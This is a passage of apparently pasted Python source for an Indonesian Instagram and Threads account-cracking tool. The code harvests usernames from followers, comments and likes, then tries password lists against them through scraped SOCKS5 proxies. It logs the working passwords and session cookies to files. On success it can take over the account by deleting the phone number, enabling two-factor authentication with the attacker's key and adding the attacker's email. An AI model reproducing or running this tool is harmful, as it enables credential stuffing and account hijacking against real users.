                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecAjax(username, password)
        self.looping+=1
        
    def ExecAjax_Threads(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                curl = byps.get('https://www.threads.net/accounts/onetap/?next=%2F&hl=en', allow_redirects=True)
                headers = {
                    'Host': 'www.instagram.com',
                    'content-length': str(random.randint(2000,2999)),
                    'x-ig-app-id': '1217981644879628',
                    'x-instagram-ajax': '1011794706',
                    'user-agent': Useragent().useragent_ajax(),
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'x-asbd-id': '129477',
                    'dpr': '2',
                    'x-csrftoken': curl.cookies.get('csrftoken',None),
                    'accept': '*/*',
                    'origin': 'https://www.threads.net',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.threads.net/?hl=en',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'en-US;q=0.8,en;q=0.9'
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecAjax_Threads(username, password)
        for passwd in password:
            try:          
                payload = {
                    'enc_password': Requre().enc_password(passwd),
                    'optIntoOneTap':'false',
                    'queryParams':json.dumps({""hl"":""en""}),
                    'trustedDeviceRecords':'{}',
                    'username': username,
                }
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.threads.net/api/v1/web/accounts/login/ajax/', data = payload, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'userId' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecAjax_Threads(username, password)
        self.looping+=1
        
"
Zb1gG4mJ,203.78.117.57-/sdcard/instagram.py.py,OBF-XIn,Python,Thursday 7th of March 2024 03:55:22 PM CDT,"# create by ZORA ID 2024

import os, re, sys, json, time, random, datetime, requests
import uuid, hmac, hashlib, urllib, shutil
from enc_password import Requre
from amankan_data import Require
from useragent import Useragent
from facebook import Facebook
from bs4 import BeautifulSoup as bs
from rich.tree import Tree
from rich import print as printz
from rich.panel import Panel
from rich.console import Console
from rich.columns import Columns
from concurrent.futures import ThreadPoolExecutor

dump = []
            
class Requ:
    def __init__(self) -> None:
        self.proxies = []
        pass        
        
    def Convert_Name(self, xxx, cookie):
        with requests.Session() as r:
            try:
                response = r.get(f'https://www.instagram.com/{xxx}/', headers = {""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3""}, cookies={'cookie': cookie}).text
                if 'user_id' in str(response):
                    return(re.findall('""user_id"":""(\d+)""', str(response))[0])
            except (Exception) as e: pass
            
    def Convert_Url(self, xxx, cookie):
        with requests.Session() as r:
            try:
                response = r.get(xxx, cookies={'cookie': cookie}).text
                if 'media_id' in str(response):
                    return(re.findall('{""media_id"":""(.*?)""',str(response))[0])
            except (Exception) as e: exit(e)

    def Validasi_Username(self, username):
       with requests.Session() as r:
           try:
               response = r.get(""https://i.instagram.com/api/v1/users/web_profile_info/?username={}"".format(username), headers = {""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3""}).json()
               return (response[""data""][""user""][""full_name""], response[""data""][""user""][""edge_followed_by""][""count""], response[""data""][""user""][""edge_follow""][""count""], response[""data""][""user""][""edge_owner_to_timeline_media""][""count""])
           except (Exception) as e: return(None,None,None,None)
        
    def Socksku(self):
        with requests.Session() as r:
            try:
                response = r.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol={}&timeout=100000&country=all&ssl=all&anonymity=all'.format('socks5')).text
                for prox in response.splitlines():
                    self.proxies.append(prox)
                return self.proxies
            except (requests.exceptions.ConnectionError): time.sleep(5); self.Socksku()                 

class Terminal:
    def __init__(self) -> None:
        pass
        
    def Clear_Terminal(self):
        os.system('clear' if 'linux' in sys.platform.lower() else 'cls')
        
    def Banner_Terminal(self):
        self.Clear_Terminal()
        Console(width = 65, style = ""bold grey50"").print(Panel(""""""[bold red]●[bold yellow] ●[bold green] ●[bold white]
[bold red]           _____                 _____  _____)     __  
[bold red]          (, /  |       ,       (, /  /        (__/  ) 
            /---| __      __      /  /   ___     /     
[bold white]         ) /    |_/_)__(_     ___/__/     / ) ) /      
[bold white]        (_/    .-/          (__ /  (____ /   (_/       
              (_/                                            
     [bold white]Version :[bold blue] 2.0[bold white] || Status :[bold green] Premium[bold white] || Type :[bold blue] Hacking""""""))
        return (""Berhasil"")
        
    def Layar_Terminal(self):
        self.get_terminal_size = re.search('columns=(\d+),', str(os.get_terminal_size())).group(1)
        if int(self.get_terminal_size) < 65:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Anda Diwajibkan Untuk Mengecilkan Tampilan Termux Sampai Kotak Ini Terlihat Rapi!...""))
            exit()
        else:
            pass
        
class Login:
    def __init__(self) -> None:
        Terminal().Layar_Terminal()
        pass
        
    def Username_And_Password(self):
        try:
            Terminal().Banner_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silakan Masukan Cookie Instagram, Pastikan Akun Tidak Limite!"", subtitle = ""╭─────"", subtitle_align = ""left""))
            cookies = Console().input(""[bold grey50]   ╰─> "")
            if len(cookies) >0:
                self.username,  self.fullname = self.Validasi_Cookies(cookies)
                with open('Cookie_Instagram.json', 'w') as wr:
                    wr.write(json.dumps({
                        ""Cookie"": cookies,
                    }))
                    wr.close()
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Selamat Datang [green]{self.username}/{self.fullname}[white], Jalankan Ulang Perintahnya!!...""))
                exit()
            else:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Masukan Cookie Instagram, Masukan Dengan Benar, Jangan Kosong Ngab!!...""))
                exit()
        except (KeyboardInterrupt, Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Opss, Cookies Salah, Exspired Atau Limite, Silakan Ganti Akun Tumbal, Di Sarankan Membuat Akun Baru!"")) 
            exit()     
        
    def Validasi_Cookies(self, cookies):
        with requests.Session() as r:
            r.headers.update({
                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
            })
            response = r.get('https://i.instagram.com/api/v1/users/{}/info/'.format(re.findall('ds_user_id=(\d+)',str(cookies))[0]), cookies = {
                'cookie': cookies
            })
            self.payload = json.loads(response.text)
            if '\'username\':' in str(self.payload):
                self.username = self.payload['user']['username']
                self.fullname = self.payload['user']['full_name']
                return(self.username, self.fullname)
            else:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Opss, Cookies Exspired Atau Limite, Silakan Ganti Akun Tumbal, Di Sarankan Membuat Akun Baru!""))
                time.sleep(3.5)
                self.Username_And_Password()
                
class Instagram:
    def __init__(self):
        self.Kilometers, self.Meterans, self.amankan_akun = [],[],[]
        self.success, self.chekpoint, self.faktor, self.looping = 0,0,0,0

    def Remove_Cookie(self):
        try: os.system('rm -rf Cookie_Instagram.json')
        except (Exception): pass
        Login().Username_And_Password() 

    def Chek_Cookies(self, created, exspired, sisa):
        try:
           cookie = json.loads(open('Cookie_Instagram.json', 'r').read())['Cookie']
           self.Menu_Instagram(created, exspired, sisa, cookie)          
        except (FileNotFoundError) as e:
           Terminal().Clear_Terminal()
           Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
           Console().input(""[bold grey50]   ╰─> File Not Found Error!!.."")
           self.Remove_Cookie()
           
    def Menu_Instagram(self, created, exspired, sisa, cookie):
        try:
            self.username, self.fullname = Login().Validasi_Cookies(cookie)
        except (KeyError) as e:
            Terminal().Clear_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Console().input(""[bold grey50]   ╰─> Terjadi Kesalahan, Cookie Exspired Atau Limite!!.."")
            self.Remove_Cookie() 
            
        except (requests.exceptions.ConnectionError) as e:
            Terminal().Clear_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Console().input(""[bold grey50]   ╰─> Terjadi Kesalahan, Koneksi Anda Error!!.."")
            self.Chek_Cookies()
        try:                     
            Terminal().Banner_Terminal() 
            self.Kilometers.append(Panel(f'[bold green]•[bold white] Username [bold green]{self.username}\n[bold green]•[bold white] Fullname [bold green]{self.fullname}', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Info Akun) [bold green]<[bold yellow]<[bold red]<',width=32, style='bold grey50'))
            self.Kilometers.append(Panel(f'[bold green]•[bold white] Bergabung [bold green]{created}\n[bold green]•[bold white] Expired [bold green]{exspired} [bold yellow]{sisa}[bold white] hari', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Info License) [bold green]<[bold yellow]<[bold red]<',width=32, style='bold grey50'))
            Console().print(Columns(self.Kilometers))
        except (AttributeError) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()
        Console(width = 65, style = ""bold grey50"").print(Panel('''[bold white][bold green]01[bold white]. Crack Nama Dari Follower\t[bold white][bold green]06[bold white]. Chek Result Crack\n[bold white][bold green]02[bold white]. Crack Nama Dari Followed\t[bold white][bold green]07[bold white]. Beralih Ke Facebook\n[bold white][bold green]03[bold white]. Crack Nama Dari Search\t[bold white][bold green]00[bold red].[bold red] Deleted Cookies\n[bold white][bold green]04[bold white]. Crack Nama Dari Komentar\n[bold white][bold green]05[bold white]. Crack Nama Dari Likes''', subtitle = ""╭─────"", subtitle_align = ""left""))
        query = Console().input(""[bold grey50]   ╰─> "")
        if query == '01' or query == '1':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Name(self.username, cookie)
                try: self.Dump_Followers(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '02' or query == '2':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Name(self.username, cookie)
                try: self.Dump_Following(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '03' or query == '3':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Username Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[italic green] partner.hmei3,partner.hmei7[italic white] *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    try: self.Dump_Search(self.username, cookie)
                    except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '04' or query == '4':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Url Postingan Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Url(self.username, cookie)
                try: self.Dump_Komentar(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '05' or query == '5':
            try:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silahkan Masukan Url Postingan Akun Instagram Target Pastikan Tidak Terkunci Dan Centang Biru Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, *Gunakan[italic red] CTRL + C[italic white] Untuk Berhenti!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Catatan) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
                username = Console().input(""[bold grey50]   ╰─> "")
                for self.username in username.split(','):
                    uid = Requ().Convert_Url(self.username, cookie)
                try: self.Dump_Likers(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Jumlah Username Terlalu Sedikit Anda Harus Mencari Target Yang Lain Dan Pastikan Username Yang Terkumpul lebih Dari 50 Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<""))
                    exit()
                else:
                    Console(width = 65).print(Panel(f'{len(dump)}',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Jumlah Username) [bold green]<[bold yellow]<[bold red]<',style='bold grey50'),justify='center')
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '06' or query == '6':
            try:
                Console(width=65).print(Panel('[bold green]01[bold white]. Chek Result OK\n[bold green]02[bold white]. Chek Result 2F\n[bold green]03[bold white]. Chek Result CP',style='bold grey50'), justify='center')
                choose = Console().input(""[bold grey50]   ╰─> "")
                if choose =='01' or choose =='1':
                    try:
                        file = os.listdir('/sdcard/OK')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic green]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File OK) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File OK, Masukan Nama File, Misalnya : [bold green]OK-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                elif choose =='02' or choose =='2':
                    try:
                        file = os.listdir('/sdcard/2F')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File 2F) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File 2F, Masukan Nama File, Misalnya : [bold red]2F-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                elif choose =='03' or choose =='3':
                    try:
                        file = os.listdir('/sdcard/CP')
                    except (Exception) as e:
                        Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                        exit()
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic yellow]{str(file)}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (File CP) [bold green]<[bold yellow]<[bold red]<""))
                    Console(width=65).print(Panel('[bold white]Chek File CP, Masukan Nama File, Misalnya : [bold yellow]CP-18-Maret-2024[bold white]',style='bold grey50' ,subtitle = ""╭─────"", subtitle_align = ""left""))
                    files = Console().input(""[bold grey50]   ╰─> "")
                    self.Result(choose,files)
                    exit()
                else:
                    Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Menu Instagram!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                    exit()   
            except (Exception) as e:
